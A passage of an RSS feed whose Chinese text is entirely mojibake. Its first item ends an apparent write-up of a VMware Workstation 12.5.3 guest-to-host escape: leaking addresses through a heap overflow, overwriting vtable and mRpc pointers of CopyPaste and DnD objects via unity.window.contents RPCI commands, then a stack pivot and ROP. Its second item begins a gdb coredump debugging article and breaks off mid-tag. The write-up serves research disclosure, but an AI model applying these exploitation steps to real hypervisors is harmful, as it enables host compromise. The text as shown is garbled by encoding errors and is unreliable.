src=&quot;https://pic2.zhimg.com/v2-93e4655e592de30605e67ece4e9f1ce5_r.png&quot; data-rawwidth=&quot;1292&quot; data-rawheight=&quot;680&quot;&gt;&lt;p&gt;æˆ‘ä»¬çš„ç­–ç•¥æ˜¯ï¼šé¦–å…ˆåˆ†é…ä¸€äº›å¡«æ»¡â€œAâ€çš„å­—ç¬¦ä¸²ï¼Œç„¶åé€šè¿‡æº¢å‡ºå†™å…¥ä¸€äº›â€œBâ€ï¼Œæ¥ä¸‹æ¥è¯»å–æ‰€æœ‰åˆ†é…çš„å­—ç¬¦ä¸²ï¼Œå…¶ä¸­å«æœ‰â€œBâ€çš„å°±æ˜¯è¢«æº¢å‡ºçš„å­—ç¬¦ä¸²ã€‚è¿™æ ·æˆ‘ä»¬å°±æ‰¾åˆ°äº†ä¸€ä¸ªå­—ç¬¦ä¸²å¯ä»¥è¢«ç”¨æ¥è¯»å–æ³„éœ²çš„æ•°æ®ï¼Œç„¶åä»¥bucketçš„å†…å­˜å—å¤§å°0xA8çš„ç²’åº¦ç»§ç»­æº¢å‡ºï¼Œæ¯æ¬¡æº¢å‡ºåéƒ½æ£€æŸ¥æ³„éœ²çš„æ•°æ®ã€‚ç”±äºDnDå’ŒCPå¯¹è±¡çš„vtableè·ç¦»vmware-vmxåŸºåœ°å€çš„åç§»æ˜¯å›ºå®šçš„ï¼Œæ¯æ¬¡æº¢å‡ºååªéœ€è¦æ£€æŸ¥æœ€ä½ä¸€äº›æ•°æ®ä½ï¼Œå°±èƒ½å¤Ÿåˆ¤æ–­æº¢å‡ºæ˜¯å¦åˆ°è¾¾äº†ç›®æ ‡å¯¹è±¡ã€‚&lt;/p&gt;&lt;h2&gt;4.2 è·å–ä»£ç æ‰§è¡Œ&lt;/h2&gt;&lt;p&gt;ç°åœ¨æˆ‘ä»¬å®ç°äº†ä¿¡æ¯æ³„éœ²ï¼Œä¹Ÿèƒ½çŸ¥é“æº¢å‡ºçš„æ˜¯å“ªä¸ªC++å¯¹è±¡ï¼Œæ¥ä¸‹æ¥è¦å®ç°ä»£ç æ‰§è¡Œã€‚æˆ‘ä»¬éœ€è¦å¤„ç†ä¸¤ç§æƒ…å½¢ï¼šæº¢å‡ºCopyPasteå’ŒDnDã€‚éœ€è¦æŒ‡å‡ºçš„æ˜¯èƒ½åˆ©ç”¨çš„ä»£ç è·¯å¾„æœ‰å¾ˆå¤šï¼Œæˆ‘ä»¬åªæ˜¯é€‰æ‹©äº†å…¶ä¸­ä¸€ä¸ªã€‚&lt;/p&gt;&lt;h2&gt;4.2.1 è¦†ç›–CopyPasteå¯¹è±¡&lt;/h2&gt;&lt;p&gt;å¯¹äºCopyPasteå¯¹è±¡ï¼Œæˆ‘ä»¬å¯ä»¥è¦†ç›–è™šè¡¨æŒ‡é’ˆï¼Œè®©å®ƒæŒ‡å‘æˆ‘ä»¬å¯æ§çš„å…¶ä»–æ•°æ®ã€‚æˆ‘ä»¬éœ€è¦æ‰¾åˆ°ä¸€ä¸ªæŒ‡é’ˆï¼ŒæŒ‡é’ˆæŒ‡å‘çš„æ•°æ®æ˜¯å¯æ§å¹¶è¢«ç”¨åšå¯¹è±¡çš„è™šè¡¨ã€‚ä¸ºæ­¤æˆ‘ä»¬ä½¿ç”¨äº†å¦ä¸€ä¸ªRPCIå‘½ä»¤unity.window.contents.startã€‚è¿™ä¸ªå‘½ä»¤ä¸»è¦ç”¨äºUnityæ¨¡å¼ä¸‹ï¼Œåœ¨hostä¸Šç»˜åˆ¶ä¸€äº›å›¾åƒã€‚è¿™ä¸ªæ“ä½œå¯ä»¥è®©æˆ‘ä»¬å¾€ç›¸å¯¹vmware-vmxåç§»å·²çŸ¥çš„ä½ç½®å†™å…¥ä¸€äº›æ•°æ®ã€‚è¯¥å‘½ä»¤æ¥æ”¶çš„å‚æ•°æ˜¯å›¾åƒçš„å®½åº¦å’Œé«˜åº¦ï¼ŒäºŒè€…éƒ½æ˜¯32ä½ï¼Œåˆå¹¶èµ·æ¥æˆ‘ä»¬å°±åœ¨å·²çŸ¥ä½ç½®è·å¾—äº†ä¸€ä¸ª64ä½çš„æ•°æ®ã€‚æˆ‘ä»¬ç”¨å®ƒæ¥ä½œä¸ºè™šè¡¨ä¸­çš„ä¸€ä¸ªæŒ‡é’ˆï¼Œé€šè¿‡å‘é€ä¸€ä¸ªCopyPastå‘½ä»¤å³å¯è§¦å‘è¯¥è™šå‡½æ•°è°ƒç”¨ï¼Œæ­¥éª¤å¦‚ä¸‹ï¼š&lt;/p&gt;&lt;ul&gt;&lt;li&gt;å‘é€unity.window.contents.startå‘½ä»¤ï¼Œé€šè¿‡æŒ‡å®šå‚æ•°å®½åº¦å’Œé«˜åº¦ï¼Œå¾€å…¨å±€å˜é‡å¤„å†™å…¥ä¸€ä¸ª64ä½çš„æ ˆè¿ç§»gadgetåœ°å€&lt;/li&gt;&lt;li&gt;è¦†ç›–å¯¹è±¡è™šè¡¨æŒ‡é’ˆï¼ŒæŒ‡å‘ä¼ªé€ çš„è™šè¡¨ï¼ˆè°ƒæ•´è™šè¡¨åœ°å€åç§»ï¼‰&lt;/li&gt;&lt;li&gt;å‘é€CopyPasteå‘½ä»¤ï¼Œè§¦å‘è™šå‡½æ•°è°ƒç”¨&lt;/li&gt;&lt;li&gt;ROP&lt;/li&gt;&lt;/ul&gt;&lt;h2&gt;4.2.2 è¦†ç›–DnDå¯¹è±¡&lt;/h2&gt;&lt;p&gt;å¯¹äºDnDå¯¹è±¡ï¼Œæˆ‘ä»¬ä¸èƒ½åªè¦†ç›–vtableæŒ‡é’ˆï¼Œå› ä¸ºåœ¨å‘ç”Ÿæº¢å‡ºä¹‹åvtableä¼šç«‹é©¬è¢«è®¿é—®ï¼Œå¦ä¸€ä¸ªè™šå‡½æ•°ä¼šè¢«è°ƒç”¨ï¼Œè€Œç›®å‰æˆ‘ä»¬åªèƒ½é€šè¿‡unityå›¾åƒçš„å®½åº¦å’Œé«˜åº¦æ§åˆ¶ä¸€ä¸ªqwordï¼Œæ‰€ä»¥æ— æ³•æ§åˆ¶æ›´å¤§çš„è™šè¡¨ã€‚&lt;/p&gt;&lt;p&gt;è®©æˆ‘ä»¬çœ‹ä¸€çœ‹DnDå’ŒCPå¯¹è±¡çš„ç»“æ„ï¼Œæ€»ç»“å¦‚ä¸‹ï¼ˆä¸€äº›ç±»ä¼¼çš„ç»“æ„å¯ä»¥åœ¨open-vm-toolsä¸­æ‰¾åˆ°ï¼Œä½†æ˜¯åœ¨vmware-vmxä¸­ä¼šç•¥æœ‰åŒºåˆ«ï¼‰ï¼š&lt;/p&gt;&lt;code lang=&quot;c&quot;&gt;DnD_CopyPaste_RpcV3{  
    void * vtable;
    ...
    uint64_t ifacetype;
    RpcUtil{
        void * vtable;
        RpcBase * mRpc;
        DnDTransportBuffer{
            uint64_t seqNum;
            uint8_t * buffer;
            uint64_t totalSize;
            uint64_t offset;
            ...
        }
        ...
    }
}

RpcBase{  
    void * vtable;
    ...
}
&lt;/code&gt;&lt;p&gt;æˆ‘ä»¬åœ¨æ­¤çœç•¥äº†ç»“æ„ä¸­å¾ˆå¤šä¸æœ¬æ–‡æ— å…³çš„å±æ€§ã€‚å¯¹è±¡ä¸­æœ‰ä¸ªæŒ‡é’ˆæŒ‡å‘å¦ä¸€ä¸ªC++å¯¹è±¡RpcBaseï¼Œå¦‚æœæˆ‘ä»¬èƒ½ç”¨ä¸€ä¸ªå¯æ§æ•°æ®çš„æŒ‡é’ˆçš„æŒ‡é’ˆè¦†ç›–mRpcè¿™ä¸ªåŸŸï¼Œé‚£æˆ‘ä»¬å°±æ§åˆ¶äº†RpcBaseçš„vtableã€‚å¯¹æ­¤æˆ‘ä»¬å¯ä»¥ç»§ç»­ä½¿ç”¨unity.window.contents.startå‘½ä»¤æ¥æ¥æ§åˆ¶mRpcï¼Œè¯¥å‘½ä»¤çš„å¦ä¸€ä¸ªå‚æ•°æ˜¯imgsizeï¼Œè¿™ä¸ªå‚æ•°ä»£è¡¨åˆ†é…çš„å›¾åƒbufferçš„å¤§å°ã€‚è¿™ä¸ªbufferåˆ†é…å‡ºæ¥åï¼Œå®ƒçš„åœ°å€ä¼šå­˜åœ¨vmware-vmxçš„å›ºå®šåç§»å¤„ã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å‘½ä»¤unity.window.contents.chunkæ¥å¡«å……bufferçš„å†…å®¹ã€‚æ­¥éª¤å¦‚ä¸‹ï¼š&lt;/p&gt;&lt;ul&gt;&lt;li&gt;å‘é€unity.window.contents.startå‘½ä»¤æ¥åˆ†é…ä¸€ä¸ªbufferï¼Œåç»­æˆ‘ä»¬ç”¨å®ƒæ¥å­˜å‚¨ä¸€ä¸ªä¼ªé€ çš„vtableã€‚&lt;/li&gt;&lt;li&gt;å‘é€unity.window.contents.chunkå‘½ä»¤æ¥å¡«å……ä¼ªé€ çš„vtableï¼Œå…¶ä¸­å¡«å…¥ä¸€ä¸ªæ ˆè¿ç§»çš„gadget&lt;/li&gt;&lt;li&gt;é€šè¿‡æº¢å‡ºè¦†ç›–DnDå¯¹è±¡çš„mRpcåŸŸï¼Œè®©å®ƒæŒ‡å‘å­˜å‚¨bufferåœ°å€çš„åœ°æ–¹ï¼ˆæŸå…¨å±€å˜é‡å¤„ï¼‰ï¼Œå³å†™å…¥ä¸€ä¸ªæŒ‡é’ˆçš„æŒ‡é’ˆ&lt;/li&gt;&lt;li&gt;é€šè¿‡å‘é€DnDå‘½ä»¤æ¥è§¦å‘mRpcåŸŸçš„è™šå‡½æ•°è°ƒç”¨&lt;/li&gt;&lt;li&gt;ROP&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;P.Sï¼švmware-vmxè¿›ç¨‹ä¸­æœ‰ä¸€ä¸ªå¯è¯»å¯å†™å¯æ‰§è¡Œçš„å†…å­˜é¡µï¼ˆè‡³å°‘åœ¨ç‰ˆæœ¬12.5.3ä¸­å­˜åœ¨ï¼‰ã€‚&lt;/p&gt;&lt;h2&gt;4.3 ç¨³å®šæ€§è®¨è®º&lt;/h2&gt;&lt;p&gt;æ­£å¦‚å‰é¢æåŠçš„ï¼Œå› ä¸ºWindows LFHå †çš„éšæœºåŒ–ï¼Œå½“å‰çš„exploitæ— æ³•åšåˆ°100%æˆåŠŸç‡ã€‚ä¸è¿‡å¯ä»¥å°è¯•ä¸‹åˆ—æ–¹æ³•æ¥æé«˜æˆåŠŸç‡ï¼š&lt;/p&gt;&lt;ul&gt;&lt;li&gt;è§‚å¯Ÿ0xA8å¤§å°çš„å†…å­˜åˆ†é…ï¼Œè€ƒè™‘æ˜¯å¦å¯ä»¥é€šè¿‡ä¸€äº›mallocå’Œfreeçš„è°ƒç”¨æ¥å®ç°ç¡®å®šæ€§çš„LFHåˆ†é…ï¼Œå‚è€ƒ&lt;a href=&quot;http://illmatics.com/Understanding_the_LFH.pdf&quot; data-editable=&quot;true&quot; data-title=&quot;è¿™é‡Œ&quot;&gt;è¿™é‡Œ&lt;/a&gt;å’Œ&lt;a href=&quot;https://www.blackhat.com/docs/us-16/materials/us-16-Yason-Windows-10-Segment-Heap-Internals-wp.pdf&quot; data-editable=&quot;true&quot; data-title=&quot;è¿™é‡Œ&quot;&gt;è¿™é‡Œ&lt;/a&gt;ã€‚&lt;/li&gt;&lt;li&gt;å¯»æ‰¾å †ä¸Šçš„å…¶ä»–C++å¯¹è±¡ï¼Œå°¤å…¶æ˜¯é‚£äº›å¯ä»¥åœ¨å †ä¸Šå–·å°„çš„&lt;/li&gt;&lt;li&gt;å¯»æ‰¾å †ä¸Šå…¶ä»–å¸¦æœ‰å‡½æ•°æŒ‡é’ˆçš„å¯¹è±¡ï¼Œå°¤å…¶æ˜¯é‚£äº›å¯ä»¥åœ¨å †ä¸Šå–·å°„çš„&lt;/li&gt;&lt;li&gt;æ‰¾åˆ°ä¸€ä¸ªç‹¬ç«‹çš„ä¿¡æ¯æ³„æ¼æ¼æ´&lt;/li&gt;&lt;li&gt;æ‰“å¼€æ›´å¤šè„‘æ´&lt;/li&gt;&lt;/ul&gt;&lt;h2&gt;4.4 æ¼”ç¤ºæ•ˆæœ&lt;/h2&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-d158e3218b51842880080a282a3bf0cd_r.png&quot; data-rawwidth=&quot;960&quot; data-rawheight=&quot;540&quot;&gt;&lt;br&gt;&lt;p&gt;æ¼”ç¤ºè§†é¢‘ï¼š&lt;/p&gt;&lt;video id=&quot;105076&quot; data-swfurl=&quot;&quot; poster=&quot;&quot; data-sourceurl=&quot;http://v.youku.com/v_show/id_XMjg3MjcwMzU4MA==.html?spm=a2h3j.8428770.3416059.1&quot; data-name=&quot;VMware workstation 12.5.3é€ƒé€¸æ¼”ç¤ºâ€”åœ¨çº¿æ’­æ”¾â€”ä¼˜é…·ç½‘ï¼Œè§†é¢‘é«˜æ¸…åœ¨çº¿è§‚çœ‹&quot; data-video-id=&quot;&quot; data-video-playable=&quot;&quot; data-lens-id=&quot;&quot;&gt;&lt;/video&gt;&lt;br&gt;&lt;h3&gt;5. æ„Ÿæƒ³ä¸æ€»ç»“&lt;/h3&gt;&lt;p&gt;â€œNo pwn no funâ€ï¼Œå¦‚æœä½ æƒ³å‚åŠ Pwn2Ownè¿™æ ·çš„æ¯”èµ›ï¼Œä½ å°±éœ€è¦å‡†å¤‡å¤šä¸ªæ¼æ´ï¼Œæˆ–è€…æ‰¾åˆ°é«˜è´¨é‡çš„æ¼æ´ã€‚&lt;/p&gt;&lt;h2&gt;6. æˆ‘æ˜¯å¹¿å‘Š&lt;/h2&gt;&lt;p&gt;å¯¹å®‰å…¨ç ”ç©¶ã€å®‰å…¨ç ”å‘æ„Ÿå…´è¶£çš„æœ‹å‹æ¬¢è¿æŠ•ç®€å†åˆ°hr@chaitin.comã€‚&lt;/p&gt;</description>
<author>æ¨å¤</author>
<guid isPermaLink="false">2017-07-06-27733895</guid>
<pubDate>Thu, 06 Jul 2017 00:00:00 +0800</pubDate>
</item>
<item>
<title>ä¸€ä¸ªsizeofå¼•å‘çš„è¡€æ¡ˆ</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2017-05-12-26815897.htm</link>
<description>&lt;meta charset=&quot;utf-8&quot;&gt;
&lt;title&gt;ä¸€ä¸ªsizeofå¼•å‘çš„è¡€æ¡ˆ&lt;/title&gt;
&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/26815897&quot;&gt;åŸæ–‡&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-6ebd48b93e64e584a7fc92cd1e45c2c0_r.png&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;h2&gt;0x00 å†™åœ¨æœ€å‰&lt;/h2&gt;&lt;p&gt;åœ¨è¿™ä¸ªç³»åˆ—ä¸­ï¼Œæˆ‘ä»¬å°†ä¼šå’Œå¤§å®¶åˆ†äº«ä¸€äº›äº§å“å¼€å‘è¿‡ç¨‹ä¸­æ‰€é‡åˆ°çš„ä¸€äº›æŠ€æœ¯éš¾é¢˜å’Œå…·ä½“çš„è§£å†³è¿‡ç¨‹ä¸è§£å†³æ–¹æ³•ã€‚åœ¨ç³»åˆ—çš„ç¬¬ä¸€ç¯‡ä¸­ï¼Œæˆ‘ä»¬é¦–å…ˆå°†åˆ†äº«ä¸€æ¬¡çº¿ä¸Šç³»ç»Ÿå´©æºƒçš„å®Œæ•´è°ƒæŸ¥è¿‡ç¨‹ã€‚å¸Œæœ›èƒ½ç»™å¤§å®¶æä¾›ä¸€ç‚¹è§£å†³ç±»ä¼¼é—®é¢˜çš„æ€è·¯ã€‚&lt;br&gt;&lt;/p&gt;&lt;br&gt;&lt;h2&gt;0x10 é—®é¢˜æè¿°&lt;/h2&gt;&lt;p&gt;æŸæ—¥ä¾‹è¡Œæ£€æŸ¥æ—¶ï¼Œå‘ç°ä¸€ä¸ªéƒ¨ç½²åœ¨ç”Ÿäº§ç¯å¢ƒä¸­çš„æœåŠ¡å™¨ç¨‹åºä¼šéšæœºå´©æºƒå¹¶äº§ç”Ÿcoredumpã€‚å…¶ç‰¹å¾æ˜¯å¯¹äºæŸäº›ç‰¹å®šçš„è¾“å…¥æ—¶ï¼Œä¼šè®©ç¨‹åºç›´æ¥å´©æºƒé€€å‡ºã€‚äº‹å…³é‡å¤§ï¼Œèµ¶ç´§æŠ“ä¸‹æ¥çœ‹çœ‹ç¨‹åºå“ªé‡Œå‡ºBUGäº†ã€‚&lt;br&gt;&lt;/p&gt;&lt;br&gt;&lt;h2&gt;0x20 æ”¶é›†ä¿¡æ¯&lt;/h2&gt;&lt;p&gt;æœé›†åˆ°è¶³å¤Ÿå¤šçš„è°ƒè¯•ä¿¡æ¯æ˜¯é—®é¢˜æ’æŸ¥çš„åŸºç¡€ï¼ŒåŒ…æ‹¬ä½†ä¸é™äºç¨‹åºçš„ç‰ˆæœ¬ä¿¡æ¯ã€å´©æºƒæ—¶çš„ç°åœºä¿¡æ¯ï¼ˆCoredumpï¼ŒSyslogç­‰ï¼‰ã€ç¨‹åºä¾èµ–çš„åŠ¨æ€é“¾æ¥åº“ç­‰ã€‚&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;b&gt;Coredump&lt;/b&gt;&lt;br&gt;&lt;/li&gt;&lt;/ul&gt;&lt;br&gt;&lt;p&gt;Coredumpé‡Œä¿å­˜äº†ç¨‹åºè¿è¡Œæ—¶çš„å†…å­˜é•œåƒå’Œå´©æºƒç°åœºçš„å¯„å­˜å™¨ä¿¡æ¯ï¼Œé…åˆgdbç­‰è°ƒè¯•å·¥å…·å¯ä»¥æœ‰æ•ˆçš„å¤åŸç°åœºï¼Œé€šå¸¸æƒ…å†µä¸‹èƒ½å¤Ÿå¸®åŠ©æˆ‘ä»¬å¿«é€Ÿå®šä½é—®é¢˜å‡ºç°çš„ä½ç½®ã€‚&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;b&gt;ç¨‹åºbinary&lt;/b&gt;&lt;br&gt;&lt;/li&gt;&lt;/ul&gt;&lt;br&gt;&lt;p&gt;ç”±äºç”Ÿäº§ç¯å¢ƒä¸­çš„æœåŠ¡å™¨ç¨‹åºæ˜¯ä¸æºå¸¦è°ƒè¯•ä¿¡æ¯çš„ï¼Œè¿™æ ·åœ¨è°ƒè¯•coredumpæ—¶ä¼šå¾ˆä¸æ–¹ä¾¿ï¼ˆä¾‹å¦‚æ— æ³•çœ‹åˆ°è°ƒç”¨å †æ ˆçš„å‡½æ•°åå’Œè¡Œå·ç­‰ä¿¡æ¯ï¼‰ã€‚ä¸€ä¸ªå¥½çš„åŠæ³•æ—¶ä½¿ç”¨ç›¸åŒç‰ˆæœ¬çš„ã€ä½†æ˜¯å¸¦æœ‰è°ƒè¯•ä¿¡æ¯çš„binaryè¿›è¡Œè°ƒè¯•ã€‚å› æ­¤ï¼Œåœ¨å‘å¸ƒç¨‹åºæ—¶ï¼Œä¸€ä¸ªå¥½çš„åšæ³•æ˜¯ç”Ÿæˆä¸€ä¸ªå¸¦æœ‰è°ƒè¯•ä¿¡æ¯çš„binaryï¼Œç„¶åä½¿ç”¨&lt;i&gt;strip&lt;/i&gt;ä¹‹ç±»çš„å·¥å…·åœ¨è¿™ä¸ªbinaryåŸºç¡€ä¸Šç”Ÿæˆä¸å¸¦è°ƒè¯•ä¿¡æ¯çš„binaryï¼Œåœ¨ç”Ÿäº§ç¯å¢ƒä¸­å®é™…ä½¿ç”¨ã€‚è¿™æ ·åœ¨ç¨‹åºå‡ºç°é—®é¢˜æ—¶ï¼Œä¾¿å¯ä»¥å¾ˆå®¹æ˜“æ ¹æ®ç¨‹åºçš„ç‰ˆæœ¬ä¿¡æ¯æ‰¾åˆ°æ–¹ä¾¿è°ƒè¯•çš„binaryã€‚&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;b&gt;åŠ¨æ€é“¾æ¥åº“&lt;/b&gt;&lt;br&gt;&lt;/li&gt;&lt;/ul&gt;&lt;br&gt;&lt;p&gt;é€šå¸¸ï¼Œä¸€ä¸ªå¯æ‰§è¡Œç¨‹åºä¼šä¾èµ–ç‰¹å®šçš„åŠ¨æ€é“¾æ¥åº“ã€‚ç”±äºè°ƒè¯•è¿‡ç¨‹æ— æ³•åœ¨ç”Ÿäº§ç¯å¢ƒä¸­çš„æœºå™¨ä¸Šå®Œæˆï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦å°†åº”ç”¨ç¨‹åºæ‰€ä¾èµ–çš„åŠ¨æ€åº“éƒ½æ‹·è´å‡ºæ¥ã€‚è¿™æ ·åšçš„ç›®çš„æ˜¯ä¸ºäº†ä¿è¯è°ƒè¯•æ‰€ä½¿ç”¨çš„åŠ¨æ€åº“åŒç¨‹åºè¿è¡Œæ—¶æ‰€ä½¿ç”¨çš„ä¸€è‡´ï¼Œå¦‚æœç‰ˆæœ¬ä¸ä¸€è‡´çš„è¯ï¼Œå¾—åˆ°çš„è°ƒè¯•ä¿¡æ¯ä¼šä¸å‡†ç¡®ã€‚&lt;/p&gt;&lt;p&gt;åœ¨Linuxç³»ç»Ÿä¸­ï¼Œå¯ä»¥ç”¨&lt;i&gt;ldd&lt;/i&gt;å‘½ä»¤æ¥æŸ¥çœ‹ä¸€ä¸ªåº”ç”¨ç¨‹åºæ‰€ä¾èµ–çš„åŠ¨æ€åº“ä¿¡æ¯ã€‚&lt;/p&gt;&lt;p&gt;åœ¨gdbä¸­ï¼Œå¯ä»¥é€šè¿‡&lt;i&gt;set sysroot [Directory]&lt;/i&gt;æŒ‡ä»¤è®©gdbåŠ è½½æˆ‘ä»¬æŒ‡å®šçš„åŠ¨æ€åº“è€Œä¸æ˜¯ç›´æ¥ä½¿ç”¨ç³»ç»Ÿçš„åŠ¨æ€åº“ã€‚&lt;/p&gt;&lt;h2&gt;0x30 åˆ†æCore&lt;/h2&gt;&lt;p&gt;æ”¶é›†åˆ°æ‰€éœ€è¦çš„ä¿¡æ¯åï¼Œä¾¿å¯ä»¥ç¥­å‡ºgdbä»¥æ·±å…¥coredumpæŸ¥çœ‹é—®é¢˜å‡ºç°çš„åŸå› ã€‚&lt;/p&gt;&lt;p&gt;é¦–å…ˆï¼Œä½¿ç”¨btæŒ‡ä»¤ï¼Œæˆ‘ä»¬å¯ä»¥è®©gdbæ‰“å°å‡ºå´©æºƒæ—¶çš„ç¨‹åºè°ƒç”¨å †æ ˆã€‚&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-426db407b6a742619a2f994bba464e3d_r.png&quot; data-rawwidth=&quot;820&quot; data-rawheight=&quot;499&quot;&gt;é€šè¿‡è°ƒç”¨å †æ ˆï¼Œå¯ä»¥çœ‹åˆ°ï¼Œç¨‹åºæ˜¯åœ¨æ‰§è¡Œfreeè¿™ä¸ªå‡½æ•°æ—¶è§¦å‘äº†abortå¯¼è‡´ç¨‹åºå¼‚å¸¸ç»ˆæ­¢ã€‚mallocå’Œfreeè¿™å¯¹å‡½æ•°å¤§å®¶ä¸€å®šä¸é™Œç”Ÿï¼Œä»–ä»¬æ˜¯libcä¸ºåº”ç”¨ç¨‹åºæ‰€æä¾›çš„ä¸€å¥—ç”¨äºç”³è¯·/é‡Šæ”¾å†…å­˜çš„å‡½æ•°æ¥å£ã€‚ä½†æ˜¯ä¸ºä»€ä¹ˆç¨‹åºåœ¨è°ƒç”¨freeçš„æ—¶å€™ä¼šå¯¼è‡´å¼‚å¸¸é€€å‡ºå‘¢ï¼Ÿè¿™æ˜¯å› ä¸ºlibcä¸ºæˆ‘ä»¬çš„ç¨‹åºç»´æŠ¤äº†è¿è¡Œæ—¶çš„å†…å­˜åˆ†é…ä¿¡æ¯ï¼Œè€Œå¦‚æœæˆ‘ä»¬çš„ç¨‹åºåœ¨è¿è¡Œè¿‡ç¨‹ä¸­æ— æ„é—´ç ´åäº†libcç”¨æ¥ç®¡ç†å†…å­˜åˆ†é…çš„å…ƒæ•°æ®çš„è¯ï¼Œå°±ä¼šå¯¼è‡´åœ¨æ‰§è¡Œfreeå‡½æ•°æ—¶ï¼Œlibcå‘ç°è‡ªå·±çš„ä¸€äº›æ•°æ®è¢«ç ´åäº†ï¼Œä»è€Œç›´æ¥æŠ›å‡ºå¼‚å¸¸æ¥ç»ˆæ­¢ç¨‹åºã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬çš„ç¨‹åºå‡ºç°äº†æ‰€è°“çš„å†…å­˜ç ´åï¼ˆMemory corruptionï¼‰ã€‚&lt;br&gt;&lt;/p&gt;&lt;blockquote&gt;å¯¼è‡´freeå‡ºé”™çš„åŸå› æœ‰å¾ˆå¤šï¼Œä¾‹å¦‚åæ–‡å°†ä¼šæåˆ°çš„double freeä¹Ÿä¼šå¯¼è‡´freeå‡ºé”™ï¼Œéœ€è¦æ ¹æ®ç¨‹åºå…·ä½“åˆ†æ&lt;/blockquote&gt;&lt;p&gt;&lt;b&gt;å†…å­˜ç ´å&lt;/b&gt;&lt;/p&gt;å¯¹äºJavaç­‰æœ‰VMçš„ç¼–ç¨‹è¯­è¨€æ¥è¯´ï¼Œé€šå¸¸å¾ˆéš¾é‡åˆ°å†…å­˜ç ´åçš„é—®é¢˜ã€‚JVMä¼šåœ¨æ‰§è¡Œå†…å­˜æ“ä½œå‰é€šå¸¸ä¼šæ£€æŸ¥ä¼ å…¥çš„å‚æ•°ï¼Œå¦‚æœå‘ç°ä¼ å…¥äº†éæ³•çš„å‚æ•°ï¼ˆä¾‹å¦‚æ•°ç»„è¯»/å†™è¶Šç•Œï¼‰ï¼Œåˆ™ä¼šè§¦å‘å¼‚å¸¸å¤„ç†æµç¨‹ã€‚ç”±äºå®é™…çš„ç ´åæ“ä½œæ­¤æ—¶å°šæœªè¢«æ‰§è¡Œï¼Œå› æ­¤é€šå¸¸å¹¶ä¸ä¼šç›´æ¥ç»“æŸç¨‹åºï¼Œè€Œæ˜¯è®©ç¨‹åºè‡ªå·±æ¥å†³å®šå¦‚ä½•å¤„ç†ã€‚ä½†æ˜¯å¯¹äºCç¨‹åºæ¥è¯´ï¼Œç”±äºå¹¶æ²¡æœ‰ç±»ä¼¼çš„å†…å­˜ä¿æŠ¤æœºåˆ¶ï¼Œå› æ­¤éæ³•çš„å†…å­˜è¯»å†™ç»å¸¸å¯ä»¥è¢«æˆåŠŸçš„æ‰§è¡Œã€‚&lt;p&gt;å½“éæ³•å†…å­˜æ“ä½œæˆåŠŸæ‰§è¡Œä¹‹åï¼Œç¨‹åºæœªå¿…ç«‹åˆ»å°±èƒ½äº§ç”Ÿå¼‚å¸¸å¹¶å´©æºƒã€‚å¾€å¾€éœ€è¦ç­‰åˆ°å®é™…è¯»å–åˆ°äº†è¢«ç ´åçš„é‚£ç‰‡å†…å­˜åŒºåŸŸæ—¶ï¼Œç”±äºæ­¤æ—¶è¿™éƒ¨åˆ†å†…å­˜å·²ç»è¢«å†™å…¥äº†éæ³•çš„æ•°æ®ï¼Œè¿™æ—¶ç¨‹åºæ‰ä¼šçœŸæ­£çš„å´©æºƒã€‚æ­£æ˜¯ç”±äºè¿™ç§å»¶è¿Ÿæ€§ï¼Œå†…å­˜ç ´åé—®é¢˜å¾€å¾€éš¾ä»¥è°ƒè¯•ã€‚è¿™æ˜¯å› ä¸ºç¨‹åºå´©æºƒæ—¶çš„ç°åœºå¹¶éå†…å­˜å®é™…è¢«ç ´åæ—¶çš„ç°åœºï¼Œå› è€Œéš¾ä»¥å®šä½å†…å­˜ç ´åå®é™…å‡ºç°çš„æ—¶é—´å’Œåœ°ç‚¹ã€‚è¿™çœŸæ˜¯ä¸€ä¸ªåæ¶ˆæ¯[sad]ã€‚&lt;/p&gt;&lt;p&gt;å½“ç„¶ï¼Œæœ‰åæ¶ˆæ¯å°±ä¼šæœ‰å¥½æ¶ˆæ¯ã€‚libcâ€œè´´å¿ƒâ€çš„åœ¨å‡ºç°å´©æºƒæ—¶å‘å†…å­˜é‡Œå†™å…¥äº†ä¸€ç‚¹é”™è¯¯çš„ä¿¡æ¯ã€‚å°½ç®¡åªæœ‰ä¸€ç‚¹ä¿¡æ¯ï¼Œä½†æ˜¯ä½œä¸ºé—®é¢˜è°ƒæŸ¥çš„å¼€ç«¯ï¼Œä¹Ÿè¿˜æ˜¯æå¥½çš„ã€‚&lt;/p&gt;&lt;p&gt;è¿™ä¸ªä¿¡æ¯ä¸€èˆ¬ä¼šåœ¨abortå‡½æ•°çš„è°ƒç”¨å †æ ˆä¸­æ‰¾åˆ°ï¼Œæˆ‘ä»¬å…ˆæ‰§è¡Œä¸¤æ¬¡upï¼Œåˆ‡æ¢åˆ°abortå‡½æ•°çš„æ ˆå¸§å¤„ã€‚ï¼ˆä»€ä¹ˆï¼Ÿä¸è®°å¾—æ ˆå¸§æ˜¯ä»€ä¹ˆäº†ï¼Ÿé‚£ä½ ä¸€å®šè¦è¯»ä¸€è¯»è¿™ç¯‡æ–‡ç« ï¼š&lt;a href=&quot;https://zhuanlan.zhihu.com/p/25816426&quot; data-editable=&quot;true&quot; data-title=&quot;é“¾æ¥&quot; class=&quot;&quot;&gt;é“¾æ¥&lt;/a&gt;ï¼‰ã€‚&lt;/p&gt;&lt;p&gt;æˆ‘ä»¬æ‰“å°ä¸€ä¸‹å½“å‰çš„æ ˆå¸§ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºã€‚&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-f22e5c3e718cf8528a67dbf42819f958_r.png&quot; data-rawwidth=&quot;821&quot; 